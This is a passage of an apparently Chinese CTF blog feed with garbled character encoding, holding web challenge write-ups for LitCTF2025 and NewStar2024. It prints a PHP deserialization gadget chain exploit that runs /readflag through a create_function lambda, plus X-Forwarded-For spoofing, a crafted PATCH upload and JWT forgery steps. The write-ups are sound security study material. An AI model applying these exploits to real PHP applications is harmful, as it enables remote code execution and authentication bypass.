class="hljs-string">&#x27;die(`/readflag`);&#x27;</span>);<br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">Taki</span></span><br><span class="hljs-class"></span>&#123;<br>    <span class="hljs-keyword">private</span> <span class="hljs-variable">$musubi</span>;<br>    <span class="hljs-keyword">private</span> <span class="hljs-variable">$magic</span>;<br>    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__unserialize</span>(<span class="hljs-params"><span class="hljs-keyword">array</span> <span class="hljs-variable">$data</span></span>)</span><br><span class="hljs-function">    </span>&#123;<br>        <span class="hljs-variable language_">$this</span>-&gt;musubi = <span class="hljs-variable">$data</span>[<span class="hljs-string">&#x27;musubi&#x27;</span>];<br>        <span class="hljs-variable language_">$this</span>-&gt;magic = <span class="hljs-variable">$data</span>[<span class="hljs-string">&#x27;magic&#x27;</span>];<br>        <span class="hljs-keyword">return</span> (<span class="hljs-variable language_">$this</span>-&gt;musubi)();<br>    &#125;<br>    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__call</span>(<span class="hljs-params"><span class="hljs-variable">$func</span>,<span class="hljs-variable">$args</span></span>)</span>&#123;<br>        (<span class="hljs-keyword">new</span> <span class="hljs-variable">$args</span>[<span class="hljs-number">0</span>](<span class="hljs-variable">$args</span>[<span class="hljs-number">1</span>]))-&gt;&#123;<span class="hljs-variable language_">$this</span>-&gt;magic&#125;();<br>    &#125;<br>&#125;<br><br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">Mitsuha</span></span><br><span class="hljs-class"></span>&#123;<br>    <span class="hljs-keyword">private</span> <span class="hljs-variable">$memory</span>;<br>    <span class="hljs-keyword">private</span> <span class="hljs-variable">$thread</span>;<br>    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__invoke</span>(<span class="hljs-params"></span>)</span><br><span class="hljs-function">    </span>&#123;<br>        <span class="hljs-keyword">return</span> <span class="hljs-variable language_">$this</span>-&gt;memory.<span class="hljs-variable language_">$this</span>-&gt;thread;<br>    &#125;<br>&#125;<br><br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">KatawareDoki</span></span><br><span class="hljs-class"></span>&#123;<br>    <span class="hljs-keyword">private</span> <span class="hljs-variable">$soul</span>;<br>    <span class="hljs-keyword">private</span> <span class="hljs-variable">$kuchikamizake</span>;<br>    <span class="hljs-keyword">private</span> <span class="hljs-variable">$name</span>;<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__toString</span>(<span class="hljs-params"></span>)</span><br><span class="hljs-function">    </span>&#123;<br>        (<span class="hljs-variable language_">$this</span>-&gt;soul)-&gt;<span class="hljs-title function_ invoke__">flag</span>(<span class="hljs-variable">$this</span>-&gt;kuchikamizake,<span class="hljs-variable">$this</span>-&gt;name);<br>        <span class="hljs-keyword">return</span> <span class="hljs-string">&quot;call error!no flag!&quot;</span>;<br>    &#125;<br>&#125;<br><br><span class="hljs-variable">$Litctf2025</span> = <span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;Litctf2025&#x27;</span>];<br><span class="hljs-keyword">if</span>(!<span class="hljs-title function_ invoke__">preg_match</span>(<span class="hljs-string">&quot;/^[Oa]:[\d]+/i&quot;</span>, <span class="hljs-variable">$Litctf2025</span>))&#123;<br>    <span class="hljs-title function_ invoke__">unserialize</span>(<span class="hljs-variable">$Litctf2025</span>);<br>&#125;<span class="hljs-keyword">else</span>&#123;<br>    <span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;æŠŠOæ”¹æˆCä¸å°±è¡Œäº†å—,ç¬¨è›‹!ï½(âˆ ãƒ»Ï‰&lt; )âŒ’â˜†&quot;</span>;<br>&#125; <br></code></pre></td></tr></table></figure><blockquote><p>é¦–å…ˆæ˜¯create_function(â€œâ€, â€˜die(<code>/readflag</code>);â€™);ä¼šåˆ›å»ºä¸€ä¸ªåŒ¿åå‡½æ•°ï¼ˆlambdaæ ·å¼ï¼‰ï¼Œå…¶åˆ›å»ºä¸æ‰§è¡Œè¿‡ç¨‹ç­‰ä»·äº(<a href="https://www.cnblogs.com/zzjdbk/p/12980483.html">https://www.cnblogs.com/zzjdbk/p/12980483.html</a>)</p></blockquote><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">lambda_1</span>(<span class="hljs-params"><span class="hljs-string">&quot;&quot;</span>, <span class="hljs-string">&quot;die(/readflag);&quot;</span></span>) </span>&#123;<br><span class="hljs-keyword">return</span> <span class="hljs-keyword">die</span>(/readflag);<br>&#125;<br><span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure><p>é‚£ä¹ˆé“¾å­å°±å¾ˆæ¸…æ™°äº†</p><figure class="highlight leaf"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs leaf">Taki<span class="hljs-punctuation">#</span><span class="hljs-keyword">__unserialize</span><span class="hljs-params">()</span>==&gt;Mitsuha<span class="hljs-punctuation">#</span><span class="hljs-keyword">__invoke</span><span class="hljs-params">()</span>==&gt;KatawareDoki<span class="hljs-punctuation">#</span><span class="hljs-keyword">__toString</span><span class="hljs-params">()</span>==&gt;Taki<span class="hljs-punctuation">#</span><span class="hljs-keyword">__call</span><span class="hljs-params">()</span><br></code></pre></td></tr></table></figure><p>ç°åœ¨å°±è¦æ‰¾ä¸€ä¸ªåŸç”Ÿç±»å»è°ƒç”¨è¿™ä¸ªåŒ¿åå‡½æ•°</p><p>äº†è§£åˆ°ReflectionFunctionçš„invokeæ–¹æ³•å¯ä»¥è°ƒç”¨å‡½æ•°</p><p>æœ€åç”¨ä¸€ä¸ªç±»æ¥å¯¹é“¾å­è¿›è¡ŒåŒ…è£…ï¼Œç„¶åå¼€å¤´çš„Oå°±ä¼šè¢«è‡ªåŠ¨è½¬æ¢ä¸ºC</p><blockquote><p>å¯ä½¿ç”¨çš„ç±»ï¼š</p><p>ArrayObject::unserialize</p><p>ArrayIterator::unserialize</p><p>RecursiveArrayIterator::unserialize</p><p>SplObjectStorage::unserialize</p></blockquote><p>exp</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br></pre></td><td class="code"><pre><code class="hljs php"> <span class="hljs-meta">&lt;?php</span><br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">Taki</span></span><br><span class="hljs-class"></span>&#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$musubi</span>;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$magic</span>;<br>    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__call</span>(<span class="hljs-params"><span class="hljs-variable">$func</span>,<span class="hljs-variable">$args</span></span>)</span>&#123;<br>        (<span class="hljs-keyword">new</span> <span class="hljs-variable">$args</span>[<span class="hljs-number">0</span>](<span class="hljs-variable">$args</span>[<span class="hljs-number">1</span>]))-&gt;&#123;<span class="hljs-variable language_">$this</span>-&gt;magic&#125;();<br>    &#125;<br>&#125;<br><br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">Mitsuha</span></span><br><span class="hljs-class"></span>&#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$memory</span>;    <br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$thread</span>;<br>&#125;<br><br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">KatawareDoki</span></span><br><span class="hljs-class"></span>&#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$soul</span>;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$kuchikamizake</span>;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$name</span>;<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__toString</span>(<span class="hljs-params"></span>)</span><br><span class="hljs-function">    </span>&#123;<br>        (<span class="hljs-variable language_">$this</span>-&gt;soul)-&gt;<span class="hljs-title function_ invoke__">flag</span>(<span class="hljs-variable">$this</span>-&gt;kuchikamizake,<span class="hljs-variable">$this</span>-&gt;name);<br>    &#125;<br>&#125;<br><br><br><span class="hljs-comment">// Taki#__unserialize()==&gt;Mitsuha#__invoke()==&gt;KatawareDoki#__toString()==&gt;Taki#__call()</span><br><span class="hljs-variable">$a</span> = <span class="hljs-keyword">new</span> <span class="hljs-title class_">Taki</span>;<br><span class="hljs-variable">$a</span>-&gt;musubi = <span class="hljs-keyword">new</span> <span class="hljs-title class_">Mitsuha</span>;<br><span class="hljs-variable">$a</span>-&gt;musubi-&gt;memory = <span class="hljs-keyword">new</span> <span class="hljs-title class_">KatawareDoki</span>;<br><span class="hljs-variable">$a</span>-&gt;musubi-&gt;memory-&gt;kuchikamizake = <span class="hljs-string">&quot;ReflectionFunction&quot;</span>;<br><span class="hljs-variable">$a</span>-&gt;musubi-&gt;memory-&gt;name = <span class="hljs-string">&quot;\\00lambda_1&quot;</span>;<br><span class="hljs-variable">$a</span>-&gt;musubi-&gt;memory-&gt;soul = <span class="hljs-keyword">new</span> <span class="hljs-title class_">Taki</span>;<br><span class="hljs-variable">$a</span>-&gt;musubi-&gt;memory-&gt;soul-&gt;magic = <span class="hljs-string">&quot;invoke&quot;</span>;<br><br><span class="hljs-variable">$aa</span> = <span class="hljs-keyword">new</span> <span class="hljs-title class_">Arrayobject</span>(<span class="hljs-variable">$a</span>);<br><span class="hljs-keyword">echo</span> <span class="hljs-title function_ invoke__">urlencode</span>(<span class="hljs-title function_ invoke__">serialize</span>(<span class="hljs-variable">$aa</span>));<br><br><span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure><p>è¿˜è¦æ³¨æ„çš„ä¸€ç‚¹æ˜¯åŒ¿åå‡½æ•°çš„å‡½æ•°åæ˜¯ä¼šæ”¹å˜çš„ï¼Œåœ¨webé¡µé¢ä¸­æ‰“å¼€phpæ–‡ä»¶ï¼Œæ¯åˆ·æ–°ä¸€æ¬¡å‡½æ•°åçš„æ•°å­—å°±ä¼šåŠ ä¸€</p><p>åˆæ¬¡è¿›å…¥é¶æœºåé‡æ–°è¿›å…¥é¶æœºæäº¤çš„payloadï¼Œç”±1æ”¹ä¸ºäº†2</p><p><img src="/../images/LitCTF2025-web/j1.png"></p><blockquote><p><code>create_function()</code> ç”Ÿæˆçš„å‡½æ•°åéµå¾ª <code>lambda_&lt;æ•°å­—&gt;</code> çš„æ ¼å¼ï¼ˆå¦‚ <code>lambda_1</code>ã€<code>lambda_2</code>ï¼‰ï¼Œå…¶ä¸­æ•°å­—æ˜¯ PHP å†…éƒ¨ç»´æŠ¤çš„è®¡æ•°å™¨ã€‚æ¯æ¬¡è°ƒç”¨ <code>create_function()</code> æ—¶ï¼Œè®¡æ•°å™¨é€’å¢ï¼Œç”Ÿæˆå”¯ä¸€åç§°ã€‚</p><p>åœ¨ PHP ä¸­ï¼Œ<code>create_function()</code> ç”ŸæˆåŒ¿åå‡½æ•°æ—¶ä½¿ç”¨çš„è®¡æ•°å™¨ï¼ˆå³ <code>lambda_&lt;æ•°å­—&gt;</code> ä¸­çš„æ•°å­—ï¼‰æœ¬èº«<strong>æ²¡æœ‰æ˜ç¡®çš„ç†è®ºä¸Šé™</strong>ï¼Œå…¶èŒƒå›´å–å†³äº PHP è¿›ç¨‹çš„æ•´æ•°ç±»å‹ï¼ˆ32 ä½ç³»ç»Ÿæœ€å¤§ä¸º <code>2^31-1</code>ï¼Œ64 ä½ç³»ç»Ÿæœ€å¤§ä¸º <code>2^63-1</code>ï¼‰ã€‚ä½†åœ¨<strong>å®é™…åœºæ™¯ä¸­ï¼Œè¿™ä¸ªè®¡æ•°å™¨çš„æœ‰æ•ˆèŒƒå›´éå¸¸å°</strong>ã€‚</p><p>å¤šä¸ªaiå›ç­”ï¼Œå½“è®¡æ•°å™¨è¾¾åˆ°ä¸Šé™æ—¶ä¸ä¼šé‡æ–°ç½®ä¸º1ï¼Œè€Œæ˜¯ä¼šå‘ç”Ÿæ•´æ•°æº¢å‡ºï¼Œå¦‚æœæ˜¯æœ‰ç¬¦å·æ•´æ•°ä»è´Ÿæ•°å¼€å§‹é‡æ–°è®¡æ•°ï¼Œå¦‚æœæ˜¯æ— ç¬¦å·æ•´æ•°é‚£ä¹ˆä»0å¼€å§‹é‡æ–°è®¡æ•°ï¼Œä½†æ˜¯æˆ‘å°†payloadæ”¹ä¸ºlambda_0(å¦‚æœè®¡æ•°å™¨èŒƒå›´å¾ˆå°çš„è¯ï¼Œæœ‰ç¬¦å·æ•´æ•°ç»è¿‡å¤šæ¬¡çˆ†ç ´ä¹Ÿä¼šå›åˆ°0)æ—¶å¹¶æ²¡æœ‰æ‹¿åˆ°flagï¼Œè€Œåœ¨ä¸€æ¬¡å®Œæ•´çš„çˆ†ç ´è¿‡ç¨‹ä¸­lambda_1æœ‰å¤šä¸ªè¯·æ±‚æ‹¿åˆ°äº†flagï¼Œä¸çŸ¥é“æ˜¯ä¸æ˜¯aié”™äº†ï¼Œçœ‹phpè€Œæ–‡æ¡£ä¹Ÿå¹¶æ²¡æœ‰çœ‹åˆ°ç›¸å…³å†…å®¹</p></blockquote><p>é€šè¿‡bpçˆ†ç ´æ‹¿åˆ°flagï¼Œæˆ‘è¿™é‡Œæäº¤äº†ä¸€ä¸ªæ— å…³ç´§è¦æ¥æ§åˆ¶çˆ†ç ´æ¬¡æ•°</p><p><img src="/../images/LitCTF2025-web/j2.png"></p><p><img src="/../images/LitCTF2025-web/j3.png"></p><p>çœ‹äº†å®˜æ–¹çš„wpè¿˜æœ‰ä¸€ä¸ªéé¢„æœŸç›´æ¥åœ¨return ($this-&gt;musubi)();å¤„è°ƒç”¨åŒ¿åå‡½æ•°ï¼ŒåŸç†æ˜¯ä¸€æ ·çš„å°±ä¸å†™äº†ï¼Œè´´ä¸ªå®˜æ–¹wpï¼ˆ<a href="https://godyu.com/13917.html%EF%BC%89s">https://godyu.com/13917.htmlï¼‰s</a></p>]]></content>
    
    
    <categories>
      
      <category>ctf</category>
      
    </categories>
    
    
    <tags>
      
      <tag>ctf</tag>
      
      <tag>web</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>NewStar2024_web</title>
    <link href="/2025/05/23/NewStar2024-web/"/>
    <url>/2025/05/23/NewStar2024-web/</url>
    
    <content type="html"><![CDATA[<h1 id="web"><a href="#web" class="headerlink" title="web"></a>web</h1><h2 id="week1"><a href="#week1" class="headerlink" title="week1"></a>week1</h2><h3 id="PangBaiè¿‡å®¶å®¶ï¼ˆ1ï¼‰"><a href="#PangBaiè¿‡å®¶å®¶ï¼ˆ1ï¼‰" class="headerlink" title="PangBaiè¿‡å®¶å®¶ï¼ˆ1ï¼‰"></a>PangBaiè¿‡å®¶å®¶ï¼ˆ1ï¼‰</h3><p>level1</p><p><img src="/../images/NewStar2024-web/pangbai1_1.png"></p><p>è®¿é—®&#x2F;3578272f-18fd-432c-915e-df41579719a2è·¯ç”±</p><p>level2ï¼šgetä¼ ask&#x3D;miao</p><p>level3ï¼špostä¼ say&#x3D;hello</p><p>level4ï¼šuaå¤´çš„æµè§ˆå™¨å¼•æ“æ”¹ä¸ºPapaï¼Œpostä¼ say&#x3D;ç›å¡å·´å¡é˜¿å¡å“‡å¡ç±³å¡ç›å¡å‘£</p><p>level5ï¼šç”¨PATCHæ–¹æ³•ä¸Šä¼ ä¸€ä¸ªzipæ–‡ä»¶ï¼ŒbpæŠ“ä¸ªåŒ…ï¼Œç„¶åå»ä¿®æ”¹è¯·æ±‚åŒ…ï¼Œä¸»è¦ä¿®æ”¹éƒ¨åˆ†å¦‚ä¸‹</p><figure class="highlight nix"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><code class="hljs nix">PATCH<span class="hljs-comment">#å°†è¯·æ±‚æ–¹æ³•æ”¹ä¸ºPATCH</span><br><br><span class="hljs-params">Content-Type:</span> multipart<span class="hljs-symbol">/form-data</span>; <span class="hljs-attr">boundary</span><span class="hljs-operator">=</span>fileupload<span class="hljs-comment">#å°†è¯·æ±‚ä½“çš„æ•°æ®ç±»å‹æ”¹ä¸ºäº†å¤šéƒ¨åˆ†æ•°æ®ï¼Œå¹¶åŠ äº†ä¸€ä¸ªå­—æ®µé—´çš„åˆ†éš”ç¬¦</span><br><br><span class="hljs-operator">-</span>-fileupload<span class="hljs-comment">#ä¸Šä¼ say=ç›å¡å·´å¡é˜¿å¡å“‡å¡ç±³å¡ç›å¡å‘£</span><br><span class="hljs-params">Content-Disposition:</span> form-data; <span class="hljs-attr">name</span><span class="hljs-operator">=</span><span class="hljs-string">&quot;say&quot;</span><br><br>ç›å¡å·´å¡é˜¿å¡å“‡å¡ç±³å¡ç›å¡å‘£<br><span class="hljs-operator">-</span>-fileupload<span class="hljs-comment">#ä¸Šä¼ zipæ–‡ä»¶</span><br><span class="hljs-params">Content-Disposition:</span> form-data; <span class="hljs-attr">name</span><span class="hljs-operator">=</span><span class="hljs-string">&quot;file&quot;</span>; <span class="hljs-attr">filename</span><span class="hljs-operator">=</span><span class="hljs-string">&quot;patch.zip&quot;</span><br><br><span class="hljs-number">123</span><br><span class="hljs-operator">-</span>-fileupload--<br></code></pre></td></tr></table></figure><p>boundary(å­—æ®µåˆ†éš”ç¬¦)æ˜¯ä¸€ä¸ªå”¯ä¸€å­—ç¬¦ï¼Œæ­£æ–‡çš„æ¯ä¸€éƒ¨åˆ†ç”¨â€“boundaryå¼€å¤´ï¼Œç”¨â€“boundaryâ€“ç»“å°¾</p><p>bpè¾“å…¥ä¸­æ–‡åªéœ€å°†éœ€è¦è¾“å…¥çš„ä¸­æ–‡ä¿å­˜ä¸ºä¸€ä¸ªæ–‡ä»¶ï¼Œç„¶ååœ¨è¾“å…¥ä½ç½®å³é”®é€‰æ‹©ä»æ–‡ä»¶ä¸­ç²˜è´´å³å¯</p><p>å¾—åˆ°ä¸€ä¸ªtoken</p><p><img src="/../images/NewStar2024-web/pangbai1_2.png"></p><p>å°†cookieä¸­çš„tokenæ›¿æ¢ä¸ºæ–°å¾—åˆ°çš„tokenï¼Œè¿›å…¥ç¬¬å…­å…³</p><p>ç¬¬å…­å…³ï¼šåŠ ä¸€ä¸ªxffå¤´â€œX-Forwarded-For: 127.0.0.1â€</p><p><img src="/../images/NewStar2024-web/pangbai1_3.png"></p><p>æœ‰jwtåŠ ä¸€ä¸ªå­—ç¬¦ä¸²ï¼ŒçŒœæµ‹æ˜¯è¿›è¡Œjwtä¼ªé€ ï¼Œæ”¹ä¸ºç¬¬0å…³</p><p><img src="/../images/NewStar2024-web/pangbai1_4.png"></p><p>æ›¿æ¢tokenåï¼Œçœ‹ä¸€æ®µåŠ¨ç”»flagå°±å‡ºæ¥äº†</p><h3 id="headach3"><a href="#headach3" class="headerlink" title="headach3"></a>headach3</h3><p>flagåœ¨å“åº”å¤´</p><p><img src="/../images/NewStar2024-web/headach3.png"></p><h3 id="ä¼šèµ¢å—"><a href="#ä¼šèµ¢å—" class="headerlink" title="ä¼šèµ¢å—"></a>ä¼šèµ¢å—</h3><p>ç¬¬ä¸€å…³ï¼šctrl+uæŸ¥çœ‹é¡µé¢æºç ï¼ˆflagç¬¬ä¸€éƒ¨åˆ†ï¼šZmxhZ3tXQTB3ï¼Œå¼€å§‹ä½ çš„æ–°å­¦æœŸå§ï¼:&#x2F;4cqu1siti0nï¼‰</p><p>ç¬¬äºŒå…³ï¼šçœ‹æºç </p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><code class="hljs javascript"><span class="hljs-keyword">async</span> <span class="hljs-keyword">function</span> <span class="hljs-title function_">revealFlag</span>(<span class="hljs-params">className</span>) &#123;<br>            <span class="hljs-keyword">try</span> &#123;<br>                <span class="hljs-keyword">const</span> response = <span class="hljs-keyword">await</span> <span class="hljs-title function_">fetch</span>(<span class="hljs-string">`/api/flag/<span class="hljs-subst">$&#123;className&#125;</span>`</span>, &#123;<br>                    <span class="hljs-attr">method</span>: <span class="hljs-string">&#x27;POST&#x27;</span>,<br>                    <span class="hljs-attr">headers</span>: &#123;<br>                        <span class="hljs-string">&#x27;Content-Type&#x27;</span>: <span class="hljs-string">&#x27;application/json&#x27;</span><br>                    &#125;<br>                &#125;);<br>                <span class="hljs-keyword">if</span> (response.<span class="hljs-property">ok</span>) &#123;<br>                    <span class="hljs-keyword">const</span> data = <span class="hljs-keyword">await</span> response.<span class="hljs-title function_">json</span>();<br>                    <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-string">`æ­å–œä½ ï¼ä½ è·å¾—äº†ç¬¬äºŒéƒ¨åˆ†çš„ flag: <span class="hljs-subst">$&#123;data.flag&#125;</span>\nâ€¦â€¦\næ—¶å…‰èè‹’ï¼Œä½ æˆé•¿äº†å¾ˆå¤šï¼Œä¹Ÿå‘ç”Ÿäº†ä¸€äº›äº‹æƒ…ã€‚å»çœ‹çœ‹å§ï¼š/<span class="hljs-subst">$&#123;data.nextLevel&#125;</span>`</span>);<br>                &#125; <span class="hljs-keyword">else</span> &#123;<br>                    <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">error</span>(<span class="hljs-string">&#x27;è¯·æ±‚å¤±è´¥ï¼Œè¯·æ£€æŸ¥è¾“å…¥æˆ–æœåŠ¡å™¨å“åº”ã€‚&#x27;</span>);<br>                &#125;<br>            &#125; <span class="hljs-keyword">catch</span> (error) &#123;<br>                <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">error</span>(<span class="hljs-string">&#x27;è¯·æ±‚è¿‡ç¨‹ä¸­å‡ºç°é”™è¯¯:&#x27;</span>, error);<br>            &#125;<br>        &#125;<br><br>        <span class="hljs-comment">// æ§åˆ¶å°æç¤º</span><br>        <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-string">&quot;ä½ ä¼¼ä¹å¯¹è¿™é—¨å«åš4cqu1siti0nçš„è¯¾å¾ˆå¥½å¥‡ï¼Ÿé‚£å°±æ¥çœ‹çœ‹æ§åˆ¶å°å§ï¼&quot;</span>);<br></code></pre></td></tr></table></figure><p>ä¼ å…¥æ­£ç¡®çš„classNameå³å¯ï¼Œç”¨æç¤ºclassNameä¸º4cqu1siti0nï¼Œæ§åˆ¶å°revealFlag(â€˜4cqu1siti0nâ€™)</p><p>(æ­å–œä½ ï¼ä½ è·å¾—äº†ç¬¬äºŒéƒ¨åˆ†çš„ flag: IV95NF9yM2Fs â€¦â€¦ æ—¶å…‰èè‹’ï¼Œä½ æˆé•¿äº†å¾ˆå¤šï¼Œä¹Ÿå‘ç”Ÿäº†ä¸€äº›äº‹æƒ…ã€‚å»çœ‹çœ‹å§ï¼š&#x2F;s34l)</p><p>ç¬¬ä¸‰å…³ï¼šçœ‹æºç </p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br></pre></td><td class="code"><pre><code class="hljs javascript"><br><span class="hljs-variable language_">document</span>.<span class="hljs-title function_">addEventListener</span>(<span class="hljs-string">&#x27;DOMContentLoaded&#x27;</span>, <span class="hljs-keyword">function</span> (<span class="hljs-params"></span>) &#123;<br>    <span class="hljs-keyword">const</span> form = <span class="hljs-variable language_">document</span>.<span class="hljs-title function_">getElementById</span>(<span class="hljs-string">&#x27;seal_him&#x27;</span>);<br>    <span class="hljs-keyword">const</span> stateElement = <span class="hljs-variable language_">document</span>.<span class="hljs-title function_">getElementById</span>(<span class="hljs-string">&#x27;state&#x27;</span>);<br>    <span class="hljs-keyword">const</span> messageElement = <span class="hljs-variable language_">document</span>.<span class="hljs-title function_">getElementById</span>(<span class="hljs-string">&#x27;message&#x27;</span>);<br><br>    form.<span class="hljs-title function_">addEventListener</span>(<span class="hljs-string">&#x27;submit&#x27;</span>, <span class="hljs-keyword">async</span> <span class="hljs-keyword">function</span> (<span class="hljs-params">event</span>) &#123;<br>        event.<span class="hljs-title function_">preventDefault</span>();<br><br>  <br>        <span class="hljs-keyword">if</span> (stateElement.<span class="hljs-property">textContent</span>.<span class="hljs-title function_">trim</span>() !== <span class="hljs-string">&#x27;è§£å°&#x27;</span>) &#123;<br>            messageElement.<span class="hljs-property">textContent</span> = <span class="hljs-string">&#x27;å¦‚ä½•æ˜¯å¥½ï¼Ÿ&#x27;</span>;<br>            <span class="hljs-keyword">return</span>;<br>        &#125;<br><br>        <span class="hljs-keyword">try</span> &#123;<br>            <span class="hljs-keyword">const</span> response = <span class="hljs-keyword">await</span> <span class="hljs-title function_">fetch</span>(<span class="hljs-string">&#x27;/api/flag/s34l&#x27;</span>, &#123;<br>                <span class="hljs-attr">method</span>: <span class="hljs-string">&#x27;POST&#x27;</span>,<br>                <span class="hljs-attr">headers</span>: &#123;<br>                    <span class="hljs-string">&#x27;Content-Type&#x27;</span>: <span class="hljs-string">&#x27;application/json&#x27;</span><br>                &#125;,<br>                <span class="hljs-attr">body</span>: <span class="hljs-title class_">JSON</span>.<span class="hljs-title function_">stringify</span>(&#123; <span class="hljs-attr">csrf_token</span>: <span class="hljs-variable language_">document</span>.<span class="hljs-title function_">getElementById</span>(<span class="hljs-string">&#x27;csrf_token&#x27;</span>).<span class="hljs-property">value</span> &#125;)<br>            &#125;);<br><br>            <span class="hljs-keyword">if</span> (response.<span class="hljs-property">ok</span>) &#123;<br>                <span class="hljs-keyword">const</span> data = <span class="hljs-keyword">await</span> response.<span class="hljs-title function_">json</span>();<br>                messageElement.<span class="hljs-property">textContent</span> = <span class="hljs-string">`ç¬¬ä¸‰éƒ¨åˆ†Flag: <span class="hljs-subst">$&#123;data.flag&#125;</span>, ä½ è§£æ•‘äº†äº”æ¡æ‚Ÿï¼ä¸‹ä¸€å…³: /<span class="hljs-subst">$&#123;data.nextLevel || <span class="hljs-string">&#x27;æ— &#x27;</span>&#125;</span>`</span>;<br>            &#125; <span class="hljs-keyword">else</span> &#123;<br>                messageElement.<span class="hljs-property">textContent</span> = <span class="hljs-string">&#x27;è¯·æ±‚å¤±è´¥ï¼Œè¯·é‡è¯•ã€‚&#x27;</span>;<br>            &#125;<br>        &#125; <span class="hljs-keyword">catch</span> (error) &#123;<br>            messageElement.<span class="hljs-property">textContent</span> = <span class="hljs-string">&#x27;è¯·æ±‚è¿‡ç¨‹ä¸­å‡ºç°é”™è¯¯ï¼Œè¯·é‡è¯•ã€‚&#x27;</span>;<br>        &#125;<br>    &#125;);<br>&#125;);<br>    <br></code></pre></td></tr></table></figure><p>æ§åˆ¶å°document.getElementById(â€˜stateâ€™).textContent &#x3D; â€˜è§£å°â€™;</p><p>ï¼ˆç¬¬ä¸‰éƒ¨åˆ†Flag: MXlfR3I0c1B, ä½ è§£æ•‘äº†äº”æ¡æ‚Ÿï¼ä¸‹ä¸€å…³: 